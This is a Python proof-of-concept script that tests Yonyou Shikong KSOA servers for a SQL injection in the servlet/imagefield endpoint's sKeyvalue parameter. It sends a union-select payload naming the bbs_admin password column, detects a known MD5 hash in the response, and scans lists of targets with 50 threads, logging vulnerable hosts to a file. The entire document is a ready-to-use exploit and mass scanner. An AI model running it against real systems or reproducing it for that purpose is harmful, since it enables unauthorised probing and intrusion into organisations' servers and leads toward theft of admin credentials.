# 用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL注入
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
██╗   ██╗██╗   ██╗███████╗██╗  ██╗     ██╗  ██╗███████╗ ██████╗  █████╗ 
╚██╗ ██╔╝╚██╗ ██╔╝██╔════╝██║ ██╔╝     ██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗
 ╚████╔╝  ╚████╔╝ ███████╗█████╔╝█████╗█████╔╝ ███████╗██║   ██║███████║
  ╚██╔╝    ╚██╔╝  ╚════██║██╔═██╗╚════╝██╔═██╗ ╚════██║██║   ██║██╔══██║
   ██║      ██║   ███████║██║  ██╗     ██║  ██╗███████║╚██████╔╝██║  ██║
   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝

"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL注入POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','1'))--+"
    headers = {
        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)',
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close'

    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(f"[+]{target} 存在SQL注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在SQL注入漏洞")
    except:
        print(f"[X]{target} 网站无法访问")


if __name__ == '__main__':
    main()
